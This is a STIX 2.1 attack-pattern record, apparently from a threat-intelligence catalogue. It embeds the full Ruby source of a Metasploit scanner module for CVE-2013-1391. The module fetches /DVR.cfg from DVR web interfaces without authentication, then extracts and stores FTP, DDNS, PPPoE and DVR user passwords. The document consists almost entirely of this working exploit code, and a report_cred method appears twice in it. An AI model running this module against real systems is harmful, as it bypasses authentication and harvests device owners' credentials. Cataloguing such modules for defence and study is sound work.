{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e66453f2-3d5f-41d5-8c2e-c1dabaffa6d7",
    "created": "2024-08-14T16:27:06.664827Z",
    "modified": "2024-08-14T16:27:06.664831Z",
    "name": "Multiple DVR Manufacturers Configuration Disclosure",
    "description": " This module takes advantage of an authentication bypass vulnerability at the web interface of multiple manufacturers DVR systems, which allows to retrieve the device configuration. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/dvr_config_disclosure.rb",
            "external_id": "dvr_config_disclosure.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1391"
        },
        {
            "source_name": "reference",
            "url": "http://www.securitybydefault.com/2013/01/12000-grabadores-de-video-expuestos-en.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Multiple DVR Manufacturers Configuration Disclosure',\n      'Description' => %q{\n          This module takes advantage of an authentication bypass vulnerability at the\n        web interface of multiple manufacturers DVR systems, which allows to retrieve the\n        device configuration.\n      },\n      'Author'      =>\n        [\n          'Alejandro Ramos', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'  =>\n        [\n          [ 'CVE', '2013-1391' ],\n          [ 'URL', 'http://www.securitybydefault.com/2013/01/12000-grabadores-de-video-expuestos-en.html' ]\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n  end\n\n  def get_pppoe_credentials(conf)\n\n    user = \"\"\n    password = \"\"\n    enabled = \"\"\n\n    if conf =~ /PPPOE_EN=(\\d)/\n      enabled = $1\n    end\n\n    return if enabled == \"0\"\n\n    if conf =~ /PPPOE_USER=(.*)/\n      user = $1\n    end\n\n    if conf =~ /PPPOE_PASSWORD=(.*)/\n      password = $1\n    end\n\n    if user.empty? or password.empty?\n      return\n    end\n\n    info = \"PPPOE credentials for #{rhost}, user: #{user}, password: #{password}\"\n\n    report_note({\n      :host   => rhost,\n      :data   => info,\n      :type   => \"dvr.pppoe.conf\",\n      :sname  => 'pppoe',\n      :update => :unique_data\n    })\n\n  end\n\n\n  def get_ddns_credentials(conf)\n    hostname = \"\"\n    user = \"\"\n    password = \"\"\n    enabled = \"\"\n\n    if conf =~ /DDNS_EN=(\\d)/\n      enabled = $1\n    end\n\n    return if enabled == \"0\"\n\n    if conf =~ /DDNS_HOSTNAME=(.*)/\n      hostname = $1\n    end\n\n    if conf =~ /DDNS_USER=(.*)/\n      user = $1\n    end\n\n    if conf =~ /DDNS_PASSWORD=(.*)/\n      password = $1\n    end\n\n    if hostname.empty?\n      return\n    end\n\n    info = \"DDNS credentials for #{hostname}, user: #{user}, password: #{password}\"\n\n    report_note({\n      :host   => rhost,\n      :data   => info,\n      :type   => \"dvr.ddns.conf\",\n      :sname  => 'ddns',\n      :update => :unique_data\n    })\n\n  end\n\n  def get_ftp_credentials(conf)\n    server = \"\"\n    user = \"\"\n    password = \"\"\n    port = \"\"\n\n    if conf =~ /FTP_SERVER=(.*)/\n      server = $1\n    end\n\n    if conf =~ /FTP_USER=(.*)/\n      user = $1\n    end\n\n    if conf =~ /FTP_PASSWORD=(.*)/\n      password = $1\n    end\n\n    if conf =~ /FTP_PORT=(.*)/\n      port = $1\n    end\n\n    if server.empty?\n      return\n    end\n\n    report_cred(\n      ip: server,\n      port: port,\n      service_name: 'ftp',\n      user: user,\n      password: password,\n      proof: conf.inspect\n    )\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def get_dvr_credentials(conf)\n    conf.scan(/USER(\\d+)_USERNAME/).each { |match|\n      user = \"\"\n      password = \"\"\n      active = \"\"\n\n      user_id = match[0]\n\n      if conf =~ /USER#{user_id}_LOGIN=(.*)/\n        active = $1\n      end\n\n      if conf =~ /USER#{user_id}_USERNAME=(.*)/\n        user = $1\n      end\n\n      if conf =~ /USER#{user_id}_PASSWORD=(.*)/\n        password = $1\n      end\n\n      if active == \"0\"\n        user_active = false\n      else\n        user_active = true\n      end\n\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'dvr',\n        user: user,\n        password: password,\n        proof: \"user_id: #{user_id}, active: #{active}\"\n      )\n    }\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n\n    res = send_request_cgi({\n      'uri'          => '/DVR.cfg',\n      'method'       => 'GET'\n    })\n\n    if not res or res.code != 200 or res.body.empty? or res.body !~ /CAMERA/\n      vprint_error(\"#{rhost}:#{rport} - DVR configuration not found\")\n      return\n    end\n\n    p = store_loot(\"dvr.configuration\", \"text/plain\", rhost, res.body, \"DVR.cfg\")\n    vprint_good(\"#{rhost}:#{rport} - DVR configuration stored in #{p}\")\n\n    conf = res.body\n\n    get_ftp_credentials(conf)\n    get_dvr_credentials(conf)\n    get_ddns_credentials(conf)\n    get_pppoe_credentials(conf)\n\n    dvr_name = \"\"\n    if res.body =~ /DVR_NAME=(.*)/\n      dvr_name = $1\n    end\n\n    report_service(:host => rhost, :port => rport, :sname => 'dvr', :info => \"DVR NAME: #{dvr_name}\")\n    print_good(\"#{rhost}:#{rport} DVR #{dvr_name} found\")\n  end\nend\n"
}